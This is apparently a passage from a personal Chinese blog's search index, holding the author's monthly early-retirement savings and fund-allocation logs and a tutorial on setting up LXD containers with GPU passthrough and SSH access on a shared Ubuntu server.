从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n这是第二期次记录，这个月整体对自己的基金进行了部分调整，并增加了部分QDII投资美股标普500和纳斯达克100以及投资全球债券的基金。\n计划进度 当前极光计划完成度 0.1322%（当前资产 ÷ 目标资产），累计亏损 0.8252%，浮亏 33.01 元。\n预算及储蓄 9月的储蓄率为60.5%，整体结余情况为0。\n这个月国庆节回到了老家，导致预算严重超支，达到了3484元，估计往后的大半年时间得慢慢分摊了，也算是开局来了一个当头一棒。\n除此之外，从9月开始，增加了应急资金账户，应急资金账户是预计存够1年的生活费（后期可能增加），所以将储蓄和投资的一部分钱分摊到该账户当中了。\n9月份预算实施情况如下：\n投资组合 投资组合这个月做了更新，增加了可以投资海外市场的QDII基金，我目前采用80%国内市场+20%海外市场，国内则进一步分为50%的偏股+30%债券，海外则是70%的偏股+30%债券。\n投资海外市场本质也是一种风险分摊，但目前海外市场美股中，大部分我个人觉得在比较高的位置，可能后期虽然按照相关比例投资，但可能会考虑将一部分投入海外的基金放入到货币中备用。\n愿望清单 愿望清单中的Apple Watch已进入删除队列，已无购买欲望，同时增加了Apple Pencli和空气净化器，电子笔的作用主要最近发现书比较麻烦，用IPad反而方便携带和看书，所以有了这个想法。\n净化器则是准备12月月初准备搬进新房子，有点担心安全问题，所以净化器加入待选名单，其中两个净化器都是小米出的具备甲醛催化技术的净化器。\n这个东西我查阅了资料，发现和之前的除甲醛方案不一样，之前的除甲醛方案是通过滤芯（带活性炭）进行吸附，而长时间下来，滤芯里面堆积了甲醛不说，还会随着使用，效果也慢慢降低。而小米的这个催化技术则是将其分解成二氧化碳和水，并且官方声称的不用更换催化滤芯，有兴趣的朋友可以看看拆废 7 个净化器滤芯，除甲醛怎么选空气净化器？_哔哩哔哩_bilibili。\n同时之前的大部分净化器滤芯是采用的复合滤芯，也就是活性炭涂层都在一起，那这就有个问题，装修过房子的朋友都知道，活性炭的炭包在使用一段时间后，可以通过在阳光下的爆晒，将其内部吸附的物质释放出去，从而可以达到重复利用，但是对于复合滤芯无法达到了，要不然一起换要不然就不换。\n而小米全效净化器以及Ultra款，活性炭是单独分开的，这也就是说可以无形中省下一部分钱。\n彩蛋 关于前言做的回测，发现实际上算的结果有问题，所以在后面进行更正，也欢迎讨论，拜了个拜。\n","permalink":"https://wuyizhou.com/posts/aurora-project-2/","summary":"前言 最近想了一个方式，找了一些基金的历史数据，并且做了一些回测，下面是我做了回测后在也大的知识星球上提出的提问以及也大回复的内容。\n也大，最近一直在思考实现你提到的Mini财务自由，我采集了2019年5月1日至2023年9月15日的数据，制作了两组永久组合的数据，分别为：\n黄金基金：易方达黄金ETF(159934)。偏股基金：兴全合润混合LOF（163406）。货币基金：易方达中债1-3年国开债A(007169)。债券基金：易方达中债7-10年国开债A(003358)。 黄金基金：易方达黄金ETF(159934)。偏股基金：兴全合润混合LOF（163406）。货币基金：长城收益宝货币A(004972)。债券基金：招商产业债券A(217022) 上面两种主要验证也大之前提到的永久组合里面原书建议货币为短期国债、债券则为长期国债，这里用国开行的准国债作为国债，然后再根据也打原文章中提到的国内配置普通债券和货币基金即可，所以这里做了两组。\n参数情况为：\n当每个月的第一个交易日，自动追加1万资金，4个基金各25%。 每年2月10日，自动提取资金的7%和10%两种情况（7%和10%的区别，考虑了3%的通货膨胀） 初始资金1万元，4个基金各25%。 第一种组合，在每年提取10%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为107634，总收益为6.37%，提取后的收益为-13.93%。\n第一种组合，在每年提取7%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为77635，总收益为6.43%，提取后的收益为8.2%。\n第二种组合，在每年提取10%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为109550，总收益为8.02%，提取后的收益为-12.64%。 ![[fcba6de9b99ab585ad3816aa88c6bd49_MD5.png]]\n第二种组合，在每年提取7%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为79044，总收益为8.17%，提取后的收益为-6.73%\n经过上面的数据验证，我有几个疑问需要想向也大请教：\n经过上面的数据测试，我理解的后一种方式应该属于可行，因为在经济很差的环境下只计算出亏损6.7%，不知道这样解读是不是有错误的认知？ 我理解的债券，大部分是属于企业债，在正常的环境下，债券涨股票跌，反之一样，我理解的属于正常的资金左右流动。但对于市场差的情况下，比如这几年大经济环境不好，两者都在跌，这样风险还是很高，这对于永久组合来说是不是有点反其道而行？ 对于上述数据，也大还有其他的见解吗？ 也大的回复为：\n为什么要选择永久组合作为被动收入的回测策略呢？ 如果想要 mini 版财务自由，思考的前提条件应该是【预期收益大于提款比率】，但永久组合本身的预期收益率不太可能达到 7%～10% 这样的收益。所以用永久组合来做这个回测感觉意义不是特别大，得出的结论也因此不太有参考性。 另外做回测还需要有意识地确定回测的起止时间，这一点对于永久组合的影响倒是不太大，因为组合本身比较平稳。但对于其他权益类投资占比更高，波动更大的投资，需要更仔细地选择回测的起止时间，起止点最好能涵盖一整轮牛熊。 我自己也做过一些回测，发现除了资产配置的比例，留有一定比例的备用金，在市场低估时期避免直接提取投资、伤害本金，也有利于改善长期收益：自由之路提前 2 年 思路供你参考 不过对于这样提出想法、数据验证的回测思路还是很点赞的，喜欢这样有理有据的思考 👍 可以问问是有什么回测工具吗？还是自己写的代卖？最后的数据图很漂亮～\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n这是第二期次记录，这个月整体对自己的基金进行了部分调整，并增加了部分QDII投资美股标普500和纳斯达克100以及投资全球债券的基金。\n计划进度 当前极光计划完成度 0.1322%（当前资产 ÷ 目标资产），累计亏损 0.8252%，浮亏 33.01 元。\n预算及储蓄 9月的储蓄率为60.5%，整体结余情况为0。\n这个月国庆节回到了老家，导致预算严重超支，达到了3484元，估计往后的大半年时间得慢慢分摊了，也算是开局来了一个当头一棒。\n除此之外，从9月开始，增加了应急资金账户，应急资金账户是预计存够1年的生活费（后期可能增加），所以将储蓄和投资的一部分钱分摊到该账户当中了。\n9月份预算实施情况如下：\n投资组合 投资组合这个月做了更新，增加了可以投资海外市场的QDII基金，我目前采用80%国内市场+20%海外市场，国内则进一步分为50%的偏股+30%债券，海外则是70%的偏股+30%债券。\n投资海外市场本质也是一种风险分摊，但目前海外市场美股中，大部分我个人觉得在比较高的位置，可能后期虽然按照相关比例投资，但可能会考虑将一部分投入海外的基金放入到货币中备用。\n愿望清单 愿望清单中的Apple Watch已进入删除队列，已无购买欲望，同时增加了Apple Pencli和空气净化器，电子笔的作用主要最近发现书比较麻烦，用IPad反而方便携带和看书，所以有了这个想法。\n净化器则是准备12月月初准备搬进新房子，有点担心安全问题，所以净化器加入待选名单，其中两个净化器都是小米出的具备甲醛催化技术的净化器。\n这个东西我查阅了资料，发现和之前的除甲醛方案不一样，之前的除甲醛方案是通过滤芯（带活性炭）进行吸附，而长时间下来，滤芯里面堆积了甲醛不说，还会随着使用，效果也慢慢降低。而小米的这个催化技术则是将其分解成二氧化碳和水，并且官方声称的不用更换催化滤芯，有兴趣的朋友可以看看拆废 7 个净化器滤芯，除甲醛怎么选空气净化器？_哔哩哔哩_bilibili。\n同时之前的大部分净化器滤芯是采用的复合滤芯，也就是活性炭涂层都在一起，那这就有个问题，装修过房子的朋友都知道，活性炭的炭包在使用一段时间后，可以通过在阳光下的爆晒，将其内部吸附的物质释放出去，从而可以达到重复利用，但是对于复合滤芯无法达到了，要不然一起换要不然就不换。\n而小米全效净化器以及Ultra款，活性炭是单独分开的，这也就是说可以无形中省下一部分钱。\n彩蛋 关于前言做的回测，发现实际上算的结果有问题，所以在后面进行更正，也欢迎讨论，拜了个拜。","title":"#2-极光计划实证：当头一棒"},{"content":"前言 这是一篇关于投资的文章，也是第一期（较为啰嗦），记录了一个30岁的男人，通过理财、投资，在45岁之前达到”财务自由“，对于财务自由，我比较赞同也大的这篇文章中提到的定义，\n被动收入：充足的本金和投资能力，并且投资的收益能够覆盖全部的生活支出。 为自己而活：而财务自由的在于通过财务自由让自己将时间投入到热爱的事情上。 简单富足：无需大富大贵，只保证体面、正常的生活开销。 关于该计划，也是一路学习、摸索过来，从大概今年开始断断续续的学习投资、理财，期间也关注了很多的优秀博主，大量泛读文章，如今也算是摸着一点门槛了，期间觉得博主通过理财投资完成了一些\u0026quot;退休计划\u0026quot;，比较憧憬，所以也就有了这个计划。\n对于计划这个事，我在之前早早就有了几次规划，但是觉得不太成熟，就一直迭代、反复否定、学习，才产生了这次自己觉得比较靠谱的方案，而这个”靠谱“不是这个计划一定能赚钱，而是来自于对计划中投资的东西有个七七八八的了解，知道自己投的是什么，知道投的基金会投什么。\n虽然自己仍然处于学习的过程中，但是回顾之前学习投资理财的过程，发现仍然还是踩了非常多的坑，我学习方式是通过孟岩创建的”有知有行“为主线，然后再结合大量的文章碎片化学习，这样的方式好处在于不枯燥、见效快、现学现用。\n但上面提到的这种方式也有坏处，因为缺少底层理论支撑，越到后面越容易显现出理论不足的缺陷，所以在学习投资理财的过程中发现，学习一门新的知识，时间充足下还是建议从理论开始，而关于从理论开始学习打基础的时候，框架很重要，而学习的框架有很多可以借鉴，比如”简七读财“的文章所提到的：\n入门可以参考一下理财规划师的培训教材，或者银行 / 基金 / 证券公司从业人员资格考试的基础教材，都可以快速建立起一个专业框架\n说多了，还是回头来说说”极光计划“，为什么叫”极光“呢？因为我从很早之前一直都想去一次挪威看看极光，并且可以住在下图这样的民宿中，所以这个计划叫”极光计划“也算是一个愿景了。\n这个计划我打算耗时15年，时间够长，但随着自身的竞争力提升，可能工资会上涨，所以计划提前也是很正常，当然不排除失业、工资降低等导致计划无法执行下去。\n明确的计划 财务自由的目标是采用”躺赚“的方式，存够300万，因我本身涉及到部分买房的借钱以及贷款，所以每个月准备拿40%钱用于投资，然后按照15年内平均年化在10%，也就差不多了。\n当然这个自己也不是自己凭空想象出来的，而是通过大致估算（因为前期没有认真记账和做预算，所以根据自己的年收入和存款率做了一个估算）大概需要每年20-25万的生活开销，再按照投资的10%的收益，取其中7%作为每年的生活费用（3%不算入是因为防止通货膨胀），所以这样算下来每年也就是需要300万的资金。\n关于每个月需要存多少钱，然后最终按照理想情况的需要多少月，可以通过(Investment Calculator)工具进行估算。\n提升收入 没有一夜暴富，要慢慢接受变富，普通人投资的钱绝大部分来自于工资收入，所以努力提升自身的竞争力，在投资上专业人士为了提升百分之几的收益率想尽办法，自己有这个闲心去研究提升收益率（研究了也是白研究），不如提升自己的竞争力，从而提高工资比这个容易多了。\n开始储蓄 规划自己的工资最好的方式来自于预算，预算表面看来是限制消费，而实际上预算是在合理的情况下保证消费合理，不会因为有预算降低了自己的幸福感。\n关于预算建议用表格先把自己的收入、开销列出来，然后就知道自己每月的整体情况，然后每月的预算控制推荐用MoneyWIZ，网上有很多的教程。\n投资意识 投资需要注意两个事情，第一个是慢慢变富，第二个投资本质就是认知变现的过程。世界上没有一夜暴富，也不是说要等”有钱“才能理财，并且在这个过程中投资的本质也是你将你学习到的知识变现的过程，让钱自己赚钱，即被动收入，所以持续的学习投资也是持续的变现的过程。\n理性决策 生活中有非常多的决策，比如是否换手机、是否换车、是先买房还是先投资等，这些都需要理性的决策。\n目前我采用的是两个工具，第一个是”愿望清单“，我把愿望清单看作冷静期等待工具，比如当我想买一个Apple Watch的时候，我就先丢进愿望清单，并且设置一个优先级别”高“，然后每周检查一遍清单，过了4周，我基本上将Apple Watch的等级优先级降低为了”低“。同时每个月我会检查，前3个月加入愿望清单中的东西如果还保持低，那么就会删除这项，说明该物品只是一时兴起导致的购买欲望。\n第二个则是”致命三问“，通过如下三点审问自己，如果其中一点都不符合，说明需要考虑这个东西的实际是否有用了。\n零浪费Check：这笔消费符合零浪费原则吗？有没有和已有的物品功能重合？ 省钱Check：这笔消费能反过来省钱吗？ 节省时间Check：这笔消费能帮我省时间吗？省下的时间能变成钱吗？ 比如我想要买的Apple Watch：\n零浪费Check：没有重叠，但目前健身只需要电视即可以跟着做，Apple Watch只能采集数据的作用，有点浪费。 省钱Check：好像没有省钱的作用。 节省时间Check：好像没有省时间的作用。 根据上述的自问，Apple Watch实际只有第一条满足了，所以可以再观察观察。\n实证 上面的前言说完了，这部分就开始说说计划的主要内容，这部分主要包含了计划进度、预算以及储蓄情况、愿望清单、投资组合。\n实证我与每月月初的1-10日发布，用于记录上一月的情况。\n计划进度 当前极光计划完成度 0.1003%（当前资产 ÷ 目标资产），自 2023 年 8 月起，累计收益率 0.37%，浮盈 7.32 元。\n预算及储蓄 每个月所有生活预算为2910元，除此之外还设定了攒点钱、分摊预算、奖励预算三个预算，每个预算都设立了结余的功能，也就是当前月每月用完或者用超都会转移到下个月一起算。\n攒点钱的作用为每个月如果有结余的话，则把预算转移到这里面，分摊预算是遇见购买大件或者吃饭等非个人消费，将其放在这里面，其作用是后期每月分摊，直至其分摊完成，有点像自己搞的分期记录。\n8月份预算实施情况如下：\n愿望清单 愿望清单目前只有一个Apple Watch，并且优先级已经经过3周的调整至低了。\n投资组合 投资组合我目前采用的方式是前期抄作用，后期通过学习慢慢配置组合。目前照搬了股票类中的沪深300、中证红利、创业板、中证500，货币和债券全抄。\n目前自己分配股票60%，债券30%，货币10%。\n同时自己记录收益用了两个方式，第一个为有知有行的记账功能，主要用于记录整体的收益情况以及完成进度。第二个则为表格。\n","permalink":"https://wuyizhou.com/posts/aurora-project-1/","summary":"前言 这是一篇关于投资的文章，也是第一期（较为啰嗦），记录了一个30岁的男人，通过理财、投资，在45岁之前达到”财务自由“，对于财务自由，我比较赞同也大的这篇文章中提到的定义，\n被动收入：充足的本金和投资能力，并且投资的收益能够覆盖全部的生活支出。 为自己而活：而财务自由的在于通过财务自由让自己将时间投入到热爱的事情上。 简单富足：无需大富大贵，只保证体面、正常的生活开销。 关于该计划，也是一路学习、摸索过来，从大概今年开始断断续续的学习投资、理财，期间也关注了很多的优秀博主，大量泛读文章，如今也算是摸着一点门槛了，期间觉得博主通过理财投资完成了一些\u0026quot;退休计划\u0026quot;，比较憧憬，所以也就有了这个计划。\n对于计划这个事，我在之前早早就有了几次规划，但是觉得不太成熟，就一直迭代、反复否定、学习，才产生了这次自己觉得比较靠谱的方案，而这个”靠谱“不是这个计划一定能赚钱，而是来自于对计划中投资的东西有个七七八八的了解，知道自己投的是什么，知道投的基金会投什么。\n虽然自己仍然处于学习的过程中，但是回顾之前学习投资理财的过程，发现仍然还是踩了非常多的坑，我学习方式是通过孟岩创建的”有知有行“为主线，然后再结合大量的文章碎片化学习，这样的方式好处在于不枯燥、见效快、现学现用。\n但上面提到的这种方式也有坏处，因为缺少底层理论支撑，越到后面越容易显现出理论不足的缺陷，所以在学习投资理财的过程中发现，学习一门新的知识，时间充足下还是建议从理论开始，而关于从理论开始学习打基础的时候，框架很重要，而学习的框架有很多可以借鉴，比如”简七读财“的文章所提到的：\n入门可以参考一下理财规划师的培训教材，或者银行 / 基金 / 证券公司从业人员资格考试的基础教材，都可以快速建立起一个专业框架\n说多了，还是回头来说说”极光计划“，为什么叫”极光“呢？因为我从很早之前一直都想去一次挪威看看极光，并且可以住在下图这样的民宿中，所以这个计划叫”极光计划“也算是一个愿景了。\n这个计划我打算耗时15年，时间够长，但随着自身的竞争力提升，可能工资会上涨，所以计划提前也是很正常，当然不排除失业、工资降低等导致计划无法执行下去。\n明确的计划 财务自由的目标是采用”躺赚“的方式，存够300万，因我本身涉及到部分买房的借钱以及贷款，所以每个月准备拿40%钱用于投资，然后按照15年内平均年化在10%，也就差不多了。\n当然这个自己也不是自己凭空想象出来的，而是通过大致估算（因为前期没有认真记账和做预算，所以根据自己的年收入和存款率做了一个估算）大概需要每年20-25万的生活开销，再按照投资的10%的收益，取其中7%作为每年的生活费用（3%不算入是因为防止通货膨胀），所以这样算下来每年也就是需要300万的资金。\n关于每个月需要存多少钱，然后最终按照理想情况的需要多少月，可以通过(Investment Calculator)工具进行估算。\n提升收入 没有一夜暴富，要慢慢接受变富，普通人投资的钱绝大部分来自于工资收入，所以努力提升自身的竞争力，在投资上专业人士为了提升百分之几的收益率想尽办法，自己有这个闲心去研究提升收益率（研究了也是白研究），不如提升自己的竞争力，从而提高工资比这个容易多了。\n开始储蓄 规划自己的工资最好的方式来自于预算，预算表面看来是限制消费，而实际上预算是在合理的情况下保证消费合理，不会因为有预算降低了自己的幸福感。\n关于预算建议用表格先把自己的收入、开销列出来，然后就知道自己每月的整体情况，然后每月的预算控制推荐用MoneyWIZ，网上有很多的教程。\n投资意识 投资需要注意两个事情，第一个是慢慢变富，第二个投资本质就是认知变现的过程。世界上没有一夜暴富，也不是说要等”有钱“才能理财，并且在这个过程中投资的本质也是你将你学习到的知识变现的过程，让钱自己赚钱，即被动收入，所以持续的学习投资也是持续的变现的过程。\n理性决策 生活中有非常多的决策，比如是否换手机、是否换车、是先买房还是先投资等，这些都需要理性的决策。\n目前我采用的是两个工具，第一个是”愿望清单“，我把愿望清单看作冷静期等待工具，比如当我想买一个Apple Watch的时候，我就先丢进愿望清单，并且设置一个优先级别”高“，然后每周检查一遍清单，过了4周，我基本上将Apple Watch的等级优先级降低为了”低“。同时每个月我会检查，前3个月加入愿望清单中的东西如果还保持低，那么就会删除这项，说明该物品只是一时兴起导致的购买欲望。\n第二个则是”致命三问“，通过如下三点审问自己，如果其中一点都不符合，说明需要考虑这个东西的实际是否有用了。\n零浪费Check：这笔消费符合零浪费原则吗？有没有和已有的物品功能重合？ 省钱Check：这笔消费能反过来省钱吗？ 节省时间Check：这笔消费能帮我省时间吗？省下的时间能变成钱吗？ 比如我想要买的Apple Watch：\n零浪费Check：没有重叠，但目前健身只需要电视即可以跟着做，Apple Watch只能采集数据的作用，有点浪费。 省钱Check：好像没有省钱的作用。 节省时间Check：好像没有省时间的作用。 根据上述的自问，Apple Watch实际只有第一条满足了，所以可以再观察观察。\n实证 上面的前言说完了，这部分就开始说说计划的主要内容，这部分主要包含了计划进度、预算以及储蓄情况、愿望清单、投资组合。\n实证我与每月月初的1-10日发布，用于记录上一月的情况。\n计划进度 当前极光计划完成度 0.1003%（当前资产 ÷ 目标资产），自 2023 年 8 月起，累计收益率 0.37%，浮盈 7.32 元。\n预算及储蓄 每个月所有生活预算为2910元，除此之外还设定了攒点钱、分摊预算、奖励预算三个预算，每个预算都设立了结余的功能，也就是当前月每月用完或者用超都会转移到下个月一起算。\n攒点钱的作用为每个月如果有结余的话，则把预算转移到这里面，分摊预算是遇见购买大件或者吃饭等非个人消费，将其放在这里面，其作用是后期每月分摊，直至其分摊完成，有点像自己搞的分期记录。\n8月份预算实施情况如下：\n愿望清单 愿望清单目前只有一个Apple Watch，并且优先级已经经过3周的调整至低了。\n投资组合 投资组合我目前采用的方式是前期抄作用，后期通过学习慢慢配置组合。目前照搬了股票类中的沪深300、中证红利、创业板、中证500，货币和债券全抄。\n目前自己分配股票60%，债券30%，货币10%。","title":"#1-极光计划实证：启航"},{"content":"环境 CPU: Intel(R) Xeon(R) Gold 6154* 2\nMomery: 128G GPU: 3080TI * 2\nDisk: 16T HD \u0026amp; 512 SSD\nSystem: Ubuntu 22.04 Server\n前言 因为最近团队对于GPU的需求量增加，但之前都是在工作电脑上直接使用GPU进行训练和使用，而几个人中只有一两台电脑有显卡，所以后期就更新了服务器。 随之而来的就会产生一个问题，大家直接用账号密码链接上去每个人的环境、配置都会造成环境、冲突，甚至导致系统出错，所有就有必要通过容器的解决方案让每个人都隔离，相互不影响，并且不能直接操作到宿主机，以保证所有人操作都在容器进行而不影响到宿主机，除此之外也需要给每一个容器映射显卡。 在这个基础上有三个相关的技术，分别为Docker、LXC、虚拟机（PVE、ESXI等）。首先排除掉Docker，Docker比较适用应用级的层面上，不符合需求。虚拟机虽然可以直通显卡等，但直通单张显卡后，其他虚拟机无法使用。所以最后就锁定到了LXD，LXD由Canonical有限公司发起，是一个类容器管理系统，而底层则基于LXC容器，额外提供了更加方便的API接口、分布式、网络管理、储存管理等，同时Ubuntu 22.04自集成了LXD，所以这里部署也是通过LXD来管理LXC容器。\n准备 16T的机械盘，分为两个分区（分区可以使用fdisk），分1T用于给LXC作储存池，剩余的15T用于挂载到宿主机下的/data目录，后期映射到每个容器的/data目录下，用于所有容器之间的数据互传和数据存储（因为相互之间的数据不涉及隐私，所以可以共用），这样的好处在于大家都将重要的数据放置/data，即使容器出现了问题，也不会影响到数据的丢失问题。 显卡驱动可以直接通过Ubuntu的GPU驱动安装，如果你没有安装显卡驱动，你可以直接输入nvidia-smi，会得到相关的提示，而不用安装网上的教程去设置，因为非常麻烦。 使用apt安装zfsutils-linux，前者用于安装LXD的储存池驱动，LXD支持多种储存池，这用于储存LXD、LXC相关的数据。 使用apt安装bridge-utils，该工具是用于管理和创建网桥设备所需要的工具和程序。 初始化LXD 通过命令执行sudo lxd init，就会得到如下的问题：\nLXD Clustering：用于集群配置，单节点不需要，默认为no，回车即可 new storage pool：需要创建一个存储池，输入yes Name of storage pool：给存储池命名，默认为default，回车即可 storage backend：存储后端，默认使用zfs，回车即可 Create a new ZFS pool：需要创建一个ZFS池，默认为no，输入yes use an existing block device：使用现有的块设备（硬盘），输入yes Path to block device：输入现有的硬盘，比如我的为sda1，那么就输入/dev/sda1 MAAS server：MAAS是一个用于将物理机视为云服务器的集群服务，默认为no，回车即可 new local network bridge：是否创建一个新的桥接网络，输入yes new bridge be called：命名新的网桥名称，默认即可 IPv4：IPv4相关配置，默认为auto，回车即可 IPv6：IPv6相关配置，默认为auto，回车即可 would you like lxd to be available over the network：使用想通过网络访问LXD，默认为no，回车即可 would you like stale cached images to be updated automatically：默认yes，回车即可 YAML printed：是否打印出lxd init的配置信息，默认为no，回车即可 创建容器模板 创建容器模板的意义在于你可以设置一个基础配置的容器，然后基于这个容器进行复制出多个容器出来，而不用再针对每个容器进行重复的基础设置。 在使用前需要下载一个已打包的容器镜像，因为需要下载，所以可以使用清华大学的国内镜像用于提升下载镜像的速度。 添加清华大学镜像源：\nsudo lxc remote add tuna-images https://mirrors.tuna.tsinghua.edu.cn/lxc-images/ --protocol=simplestreams --public 通过查找镜像列表，找到对应镜像的ID：\nsudo lxc image list tuna-images: | grep \u0026#34;ubuntu/18\u0026#34; 获取到列表后，选择对应的版本，这里我选择了id为2c44d2a68b29的ubuntu/18.04 (7 more)镜像，这是因为该版本标识了类型为容器CONTAINER。 确定好后远程的容器镜像id后，将其下载到本地并启动：\n# origin为源，这里使用上面添加的清华源，FINGERPRINT代表该源下载容器镜像id，ContainerName为创建的容器名称 sudo lxc launch origin:\u0026lt;FINGERPRINT\u0026gt; \u0026lt;ContainerName\u0026gt; # 我这里直接使用 sudo lxc launch tuna-images:2c44d2a68b29 gpuTemplate 查看是否启动成功容器可以使用sudo lxc list。\n创建公共目录 在准备阶段中宿主机的/data目录已挂载好了15T的分区，需要将其添加到上面创建的容器中：\nsudo lxc config device add \u0026lt;ContainerName\u0026gt; \u0026lt;ShareName\u0026gt; disk source=\u0026lt;host_dir_path\u0026gt; path=\u0026lt;Container_dir_path\u0026gt; #实例： sudo lxc config device add gpuTemplate share_dir disk source=/data path=/data 容器配置 因为将该容器作为基础模板，所以需要配置一些常用的依赖以及切换为国内apt源。 通过以下命令进入到容器内部：\nsudo lxc exec \u0026lt;ContainerName\u0026gt; bash 然后修改容器内部的apt源：\nvi /etc/apt/sources.list 然后将国内源写入该文件后，运行apt update更新列表即可。 安装vim、gcc、g++、make、cmake、python、lspci：\napt install vim gcc g++ make cmake python3.10 pciutils 安装Python后，将可执行文件放在/usr/bin/python3.10，所以直接需要将python3.10可执行文件软连接到当前目录为python，这样直接可以使用python命令。\nln -s /usr/bin/python3.10 /usr/bin/python 添加GPU设备到容器中 为容器添加所有GPU:\nsudo lxc config device add \u0026lt;ContainerName\u0026gt; gpu gpu 添加指定GPU：\nsudo lxc config device add \u0026lt;ContainerName\u0026gt; gpu0 gpu id=0 安装GPU驱动，网上教程中的GPU驱动安装比较麻烦，所以可以在宿主机中安装ubuntu-drivers：\napt install ubuntu-drivers-common 安装完成后使用以下命令，会得到显卡型号、推荐的显卡驱动：\nubuntu-drivers devices #返回 == /sys/devices/pci0000:3a/0000:3a:02.0/0000:3b:00.0 == modalias : pci:v000010DEd00002208sv000010DEsd00001535bc03sc00i00 vendor : NVIDIA Corporation model : GA102 [GeForce RTX 3080 Ti] manual_install: True driver : nvidia-driver-470-server - distro non-free driver : nvidia-driver-470 - distro non-free driver : nvidia-driver-515 - distro non-free driver : nvidia-driver-510 - distro non-free driver : nvidia-driver-510-server - distro non-free driver : nvidia-driver-515-open - distro non-free recommended driver : nvidia-driver-515-server - distro non-free driver : xserver-xorg-video-nouveau - distro free builtin 在这里我选择的是nvidia-driver-515-server版，然后进行到容器内部后，使用apt install nvidia-driver-515-server进行安装，安装完成后，你在容器内部使用nvidia-smi即可看见相关信息表示安装成功。 关于如果要特定的cuda版本则需要根据具体情况选择对应的显卡驱动。\n配置容器的远程登陆 安装ssh：\napt install openssh-server 安装完成后可以通过以下命令查看是否启动：\nsystemctl status sshd 配置完成后，可以找一台内网的机器通过ssh-keygen -t rsa生成非对称加密的密钥，然后将公钥的内容复制到容器内部/root/.ssh/authorized_keys文件中，保存退出，最后重启ssh服务：\nsystemctl restart sshd 配置完成后，回到宿主机中，设置端口映射，目的在于当宿主机接到的目标端口的请求的时候，将数据传输到指定端口的容器内部中，在这里配置的是sshd远程连接，所以容器接收的端口为22，宿主机的监听端口则是设置为6001，当宿主机的6001端口接到数据就转发给容器内部的22端口。 设置命令可以通过下面的代码设置：\nsudo lxc config device add \u0026lt;ContainerName\u0026gt; \u0026lt;name\u0026gt; proxy listen=tcp:\u0026lt;host_ip\u0026gt;:\u0026lt;host_port\u0026gt; connect=tcp:\u0026lt;container_ip\u0026gt;:\u0026lt;container_port\u0026gt; bind=host #这里我的设置为： sudo lxc config device add GPUTemplate testssh proxy listen=tcp:192.168.1.102:6001 connect=tcp:10.180.194.93:22 bind=host 如果后期要删除该条测试端口映射，则使用以下的命令：\n# 查看配置项目 sudo lxc config device list \u0026lt;ContainerName\u0026gt; # 找到需要删除的端口别称，然后删除 sudo lxc config device remove \u0026lt;ContainerName\u0026gt; \u0026lt;config_name\u0026gt; 制作容器实例 制作容器实例实际上就是基于现有运行的实例进行复制一份，然后再做一点基础的修改就可以让他人使用。 复制容器：\nsudo lxc copy \u0026lt;ContainerTemplateName\u0026gt; \u0026lt;newContainerName\u0026gt; 复制后，需要手动启动\nsudo lxc start \u0026lt;newContainerName\u0026gt; 复制完成后，可以按照上述的步骤设置使用者的ssh key和端口映射即可。\n参考文章 https://shenxiaohai.me/2018/12/03/gpu-server-lab/ https://linuxcontainers.org/lxd/introduction/ https://zh.wikipedia.org/wiki/LXC https://linuxcontainers.org/lxd/docs/master/explanation/storage/ https://linuxcontainers.org/lxd/docs/master/explanation/networks/ https://blog.csdn.net/zhw864680355/article/details/90411288 https://developer.nvidia.com/cuda-toolkit-archive https://www.cnblogs.com/booturbo/p/13960935.html https://pytorch.org/get-started/locally/ https://www.jianshu.com/p/978bc51029fa https://command-not-found.com/ubuntu-drivers https://www.myfreax.com/how-to-nvidia-drivers-on-ubuntu-20-04/ https://blog.csdn.net/Guzarish/article/details/118626384 https://blog.csdn.net/dou3516/article/details/120823932 https://developer.aliyun.com/article/971986 ","permalink":"https://wuyizhou.com/posts/gpu-server-lxd-multiplexing/","summary":"环境 CPU: Intel(R) Xeon(R) Gold 6154* 2\nMomery: 128G GPU: 3080TI * 2\nDisk: 16T HD \u0026amp; 512 SSD\nSystem: Ubuntu 22.04 Server\n前言 因为最近团队对于GPU的需求量增加，但之前都是在工作电脑上直接使用GPU进行训练和使用，而几个人中只有一两台电脑有显卡，所以后期就更新了服务器。 随之而来的就会产生一个问题，大家直接用账号密码链接上去每个人的环境、配置都会造成环境、冲突，甚至导致系统出错，所有就有必要通过容器的解决方案让每个人都隔离，相互不影响，并且不能直接操作到宿主机，以保证所有人操作都在容器进行而不影响到宿主机，除此之外也需要给每一个容器映射显卡。 在这个基础上有三个相关的技术，分别为Docker、LXC、虚拟机（PVE、ESXI等）。首先排除掉Docker，Docker比较适用应用级的层面上，不符合需求。虚拟机虽然可以直通显卡等，但直通单张显卡后，其他虚拟机无法使用。所以最后就锁定到了LXD，LXD由Canonical有限公司发起，是一个类容器管理系统，而底层则基于LXC容器，额外提供了更加方便的API接口、分布式、网络管理、储存管理等，同时Ubuntu 22.04自集成了LXD，所以这里部署也是通过LXD来管理LXC容器。\n准备 16T的机械盘，分为两个分区（分区可以使用fdisk），分1T用于给LXC作储存池，剩余的15T用于挂载到宿主机下的/data目录，后期映射到每个容器的/data目录下，用于所有容器之间的数据互传和数据存储（因为相互之间的数据不涉及隐私，所以可以共用），这样的好处在于大家都将重要的数据放置/data，即使容器出现了问题，也不会影响到数据的丢失问题。 显卡驱动可以直接通过Ubuntu的GPU驱动安装，如果你没有安装显卡驱动，你可以直接输入nvidia-smi，会得到相关的提示，而不用安装网上的教程去设置，因为非常麻烦。 使用apt安装zfsutils-linux，前者用于安装LXD的储存池驱动，LXD支持多种储存池，这用于储存LXD、LXC相关的数据。 使用apt安装bridge-utils，该工具是用于管理和创建网桥设备所需要的工具和程序。 初始化LXD 通过命令执行sudo lxd init，就会得到如下的问题：\nLXD Clustering：用于集群配置，单节点不需要，默认为no，回车即可 new storage pool：需要创建一个存储池，输入yes Name of storage pool：给存储池命名，默认为default，回车即可 storage backend：存储后端，默认使用zfs，回车即可 Create a new ZFS pool：需要创建一个ZFS池，默认为no，输入yes use an existing block device：使用现有的块设备（硬盘），输入yes Path to block 